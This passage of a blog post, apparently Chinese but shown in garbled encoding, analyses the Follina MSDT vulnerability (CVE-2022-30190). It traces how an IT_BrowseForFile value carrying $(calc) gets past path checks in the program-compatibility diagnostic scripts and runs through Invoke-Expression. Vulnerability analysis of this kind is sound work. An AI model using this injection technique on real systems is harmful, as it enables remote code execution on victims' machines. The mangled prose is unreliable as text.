<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/manifest.png" alt="manifest" /></p>

<p>æ•…éšœæ’é™¤åŒ…çš„è®¾è®¡åŸºäºä¸‰ä¸ªæ­¥éª¤æˆ–é˜¶æ®µï¼šæ£€æµ‹é—®é¢˜ï¼ˆtroubleshootingï¼‰ã€è§£å†³é—®é¢˜ï¼ˆresolutionï¼‰å’ŒéªŒè¯è§£å†³æ–¹æ¡ˆï¼ˆverificationï¼‰ã€‚æ¯ä¸ªé˜¶æ®µéƒ½è¡¨ç¤ºä¸ºä¸€ç»„ Windows PowerShell è„šæœ¬ï¼Œå¯¹åº”è„šæœ¬çš„å¼€å¤´åˆ†åˆ«ä¸º<strong>TS</strong>ï¼Œ<strong>RS</strong>å’Œ<strong>VF</strong>ã€‚æœ¬æ¬¡æ¼æ´ä¸­ä½¿ç”¨çš„PCWDiagnosticç¨‹åºå…¼å®¹æ€§è¯Šæ–­åŒ…å°±æ­£å¥½æœ‰ä¸‰ä¸ªå¯¹åº”é˜¶æ®µçš„ä¸åŒè„šæœ¬ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_14-25-03.png" alt="Snipaste_2022-06-08_14-25-03" /></p>

<p>å½“ç”¨æˆ·è°ƒç”¨PCWDiagnosticç¨‹åºå…¼å®¹æ€§è¯Šæ–­åŒ…æ—¶ï¼ŒWTP ä¼šå®ä¾‹åŒ–ä¸€ä¸ª Windows PowerShell è¿è¡Œç©ºé—´æ¥è¿è¡Œè„šæœ¬ï¼Œç”±äºå¯¹äºå‚æ•°æ²¡æœ‰æ­£ç¡®çš„è¿‡æ»¤å¯¼è‡´åœ¨æ‰§è¡Œè„šæœ¬æ—¶ä¼šå°†å‚æ•°ä¸­çš„â€$â€è§£æï¼Œå¯¼è‡´äº†ä»£ç æ³¨å…¥ã€‚</p>

<h2 id="è°ƒè¯•sdiagnhostexe">è°ƒè¯•sdiagnhost.exe</h2>

<p>ä½¿ç”¨dnSpyè°ƒè¯•sdiagnhost.exeï¼Œå¯ä»¥åˆ©ç”¨windbgçš„å·¥å…·gflags.exeè®¾ç½®sdiagnhost.exeçš„debugerä¸ºdnSpy.exeï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-44-25.png" alt="Snipaste_2022-06-08_16-44-25" /></p>

<p>æ‰§è¡Œåœ¨å‘½ä»¤è¡Œæ‰§è¡Œpayloadåï¼Œsdiagnhost.exeåˆ›å»ºåä¼šè¢«dnSpyè°ƒè¯•ï¼Œæ­¤æ—¶ä¸‹æ–­åœ¨<code class="language-plaintext highlighter-rouge">Microsoft.Windows.Diagnosis.ManagedHost.RunScript() </code>æ–¹æ³•ï¼Œéšåå¯åŠ¨è°ƒè¯•ä¼šæ–­åœ¨RunScriptæ–¹æ³•å†…ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-52-56.png" alt="Snipaste_2022-06-08_16-52-56" /></p>

<p>å¯ä»¥çœ‹åˆ°å¾…æ‰§è¡Œçš„PowerShellæŒ‡ä»¤textä¸­çš„å†…å®¹å°±æ˜¯scriptPathï¼Œéšååˆ°è¾¾ç¬¬äºŒä¸ªæ–­ç‚¹ã€‚æ­¤æ—¶textçš„å†…å®¹ä¾ç„¶æ˜¯scriptPathï¼Œå°†è¦æ‰§è¡Œè„šæœ¬<code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code></p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_16-59-16.png" alt="Snipaste_2022-06-08_16-59-16" /></p>

<p><code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code>è„šæœ¬è·å–msdtå‚æ•°ä¸­IT_BrowseForFileéƒ¨åˆ†çš„å†…å®¹å¹¶è°ƒç”¨<code class="language-plaintext highlighter-rouge">Test-Selection</code>æ–¹æ³•æ£€æŸ¥å‚æ•°æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_18-53-51.png" alt="Snipaste_2022-06-08_18-53-51" /></p>

<p><code class="language-plaintext highlighter-rouge">Test-Selection</code>é¦–å…ˆæ£€æŸ¥äº†IT_BrowseForFileä¼ å…¥çš„è·¯å¾„æ˜¯å¦å­˜åœ¨ï¼Œæ¥ç€æ£€æŸ¥è·¯å¾„åç¼€åæ˜¯å¦ä¸º.exeæˆ–.msiï¼Œç¬¦åˆè¿™ä¸¤ä¸ªæ¡ä»¶è¡¨ç¤ºè·¯å¾„åˆæ³•</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-00-08.png" alt="Snipaste_2022-06-08_19-00-08" /></p>

<p>å°½ç®¡/../../å·²ç»è¶…å‡ºäº†C:/çš„æ ¹è·¯å¾„ï¼Œä½†æ˜¯<code class="language-plaintext highlighter-rouge">test-path</code>æ–¹æ³•è¿”å›çš„ç»“æœä»ç„¶ä¸ºTrueï¼Œå› æ­¤è·¯å¾„è¢«åˆ¤å®šåˆæ³•ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-05-10.png" alt="Snipaste_2022-06-08_19-05-10" /></p>

<p>éšåé€šè¿‡<code class="language-plaintext highlighter-rouge">$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")</code>æ¥è¿‡æ»¤ä¼ å…¥çš„è·¯å¾„ï¼Œæµ‹è¯•äº†appnameçš„è¿‡æ»¤æ•ˆæœï¼Œå‘ç°æ‰§è¡Œäº†è¿‡æ»¤è¯­å¥å$(calc)ä»ç„¶å­˜åœ¨</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-34-34.png" alt="Snipaste_2022-06-08_19-34-34" /></p>

<p>æœ€ç»ˆè°ƒç”¨Update-DiagRootCauseæ–¹æ³•ï¼Œä¸”ä¼ å…¥TARGETPATHå’ŒAPPNAMEï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-33-46.png" alt="Snipaste_2022-06-08_19-33-46" /></p>

<p>åœ¨dnSpyä¸‹æ–­äº<code class="language-plaintext highlighter-rouge">Microsoft.Windows.Diagnosis.Commands.UpdateDiagRootCause.ProcessRecord()</code>æ–¹æ³•ï¼Œç‚¹å‡»è¿è¡ŒåæˆåŠŸæ–­ä¸‹ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-52-44.png" alt="Snipaste_2022-06-08_19-52-44" /></p>

<p>ç»§ç»­å‘ä¸‹è°ƒè¯•ï¼Œè°ƒç”¨äº†<code class="language-plaintext highlighter-rouge">scriptedDiagnosticInteraction.RecordRootcause</code>ï¼Œä¸”å°†APPNAMEå’ŒTARGETPATHä½œä¸ºå‚æ•°ä¼ å…¥ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-55-45.png" alt="Snipaste_2022-06-08_19-55-45" /></p>

<p>ç»§ç»­è¿è¡Œï¼Œå‘ç°åœåœ¨äº†<code class="language-plaintext highlighter-rouge">RunScript</code>æ–¹æ³•ï¼Œä¸”å‚æ•°æ­£æ˜¯APPNAMEå’ŒTARGETPATHï¼Œè¯´æ˜é€šè¿‡è°ƒç”¨<code class="language-plaintext highlighter-rouge">scriptedDiagnosticInteraction.RecordRootcause</code>æ–¹æ³•æ‰§è¡Œäº†è„šæœ¬<code class="language-plaintext highlighter-rouge">RS_ProgramCompatibilityWizard.ps1</code>ï¼Œå¹¶ä¸”å°†å‚æ•°APPNAMEå’ŒTARGETPATHä¼ å…¥åˆ°è„šæœ¬ä¸­ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_19-57-35.png" alt="Snipaste_2022-06-08_19-57-35" /></p>

<p>è„šæœ¬æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œå¹¶èµ‹ç»™å˜é‡$targetPathå’Œ$appNameï¼Œæ£€æŸ¥$targetPathæ˜¯å¦ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-10-50.png" alt="Snipaste_2022-06-08_20-10-50" /></p>

<p>éšååˆ†åˆ«å°†$targetPathå’Œ$appNameå½“ä½œå‘½ä»¤è¡Œå‚æ•°èµ‹ç»™$getDiagCmdï¼Œæ­¤æ—¶å‘½ä»¤è¡Œä¸­ä¼šæœ‰æ³¨å…¥çš„ä»£ç <code class="language-plaintext highlighter-rouge">$(calc)</code>ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-42-34.png" alt="Snipaste_2022-06-08_20-42-34" /></p>

<p>æœ€ç»ˆæ‰§è¡Œå‘½ä»¤è¡Œï¼Œè§¦å‘ä»£ç æ³¨å…¥ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_20-43-30.png" alt="Snipaste_2022-06-08_20-43-30" /></p>

<p>ç”±äºåœ¨å‘½ä»¤è¡Œä¸­æ—¢æœ‰$targetPathï¼Œåˆæœ‰$appNameï¼ŒçŒœæƒ³åœ¨æ‰§è¡Œå‘½ä»¤æ—¶åº”è¯¥ä¼šæ‰§è¡Œä¸¤æ¬¡calcï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-09_11-07-25.png" alt="Snipaste_2022-06-09_11-07-25" /></p>

<p>æŸ¥çœ‹procmonçš„æ—¥å¿—ï¼Œç¡®å®å‘ç°sdiagnhost.exeåˆ›å»ºäº†calc.exeä¸¤æ¬¡ï¼ŒéªŒè¯äº†çŒœæƒ³ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-09_11-09-56.png" alt="Snipaste_2022-06-09_11-09-56" /></p>

<h1 id="æ€»ç»“">æ€»ç»“</h1>

<p>æ ·æœ¬åˆ©ç”¨Officeè¿œç¨‹æ¨¡æ¿è®¿é—®è¿œç¨‹htmlï¼Œå¹¶åˆ©ç”¨<code class="language-plaintext highlighter-rouge">mshtml!ShellExecURL</code>å‡½æ•°è§£æäº†URIï¼Œè°ƒç”¨äº†msdt.exeã€‚msdtè°ƒç”¨PCWDiagnosticç¨‹åºå…¼å®¹æ€§è¯Šæ–­åŒ…ï¼Œæ„é€ äº†ç‰¹æ®Šçš„IT_BrowseForFileå‚æ•°ç»•è¿‡äº†<code class="language-plaintext highlighter-rouge">TS_ProgramCompatibilityWizard.ps1</code>å¯¹äºè·¯å¾„æ˜¯å¦å­˜åœ¨å’Œåç¼€æ˜¯å¦ä¸ºå¯æ‰§è¡Œçš„æ ¡éªŒï¼Œå°†è·¯å¾„ä½œä¸ºå‚æ•°ä¼ å…¥å¹¶æ‰§è¡Œäº†è„šæœ¬<code class="language-plaintext highlighter-rouge">RS_ProgramCompatibilityWizard.ps1</code>ï¼Œè¯¥è„šæœ¬æ£€æµ‹è·¯å¾„åç¼€ä¸º.exeåä¾¿ç›´æ¥è°ƒç”¨<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>æ‰§è¡Œäº†å‘½ä»¤è¡Œï¼Œç”±äºå‘½ä»¤è¡Œä¸­åµŒå…¥äº†è¡¨è¾¾å¼<code class="language-plaintext highlighter-rouge">$(calc)</code>ï¼Œé€ æˆäº†ä»£ç æ³¨å…¥è§¦å‘æ¼æ´ã€‚</p>

<p>æ¼æ´æœ¬èº«å¹¶ä¸å¤æ‚ï¼Œåˆ©ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œä½†æ˜¯åµŒå…¥rtfæ ¼å¼æ–‡ä»¶é…åˆé¢„è§ˆçª—æ ¼èƒ½æ„æˆä¸€ä¸ªZero-clickæ¼æ´ï¼Œäº§ç”Ÿçš„å±å®³è¿˜æ˜¯å¾ˆå¤§çš„ã€‚åˆ†ææ¼æ´çš„è¿‡ç¨‹ä¸­ä¹Ÿå­¦ä¹ äº†å¾ˆå¤šdotnetç¨‹åºçš„è°ƒè¯•æŠ€å·§å’ŒPowerShellå‘½ä»¤è¡Œçš„æ‰§è¡Œæµç¨‹ï¼Œæ„Ÿè°¢å„ä½å¸ˆå‚…ç²¾å½©çš„åˆ†ææ–‡ç« ã€‚</p>

<h1 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h1>

<p>[1] CVE-2022-30190 MSDT ä»£ç æ³¨å…¥æ¼æ´åˆ†æï¼š<em>https://paper.seebug.org/1913/</em></p>

<p>[2] Follina Microsoft Office RCE with MS-MSDT Protocolï¼š<em>https://y4er.com/post/follina-microsoft-office-rce-with-ms-msdt-protocol/</em></p>

<p>[3] Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploitï¼š<em>https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/</em></p>

<p>[4] Windows Troubleshooting Platformï¼š<em>https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wintt/windows-troubleshooting-toolkit-portal</em></p>

<p>[5] CreateUri functionï¼š<em>https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)</em></p>

:ET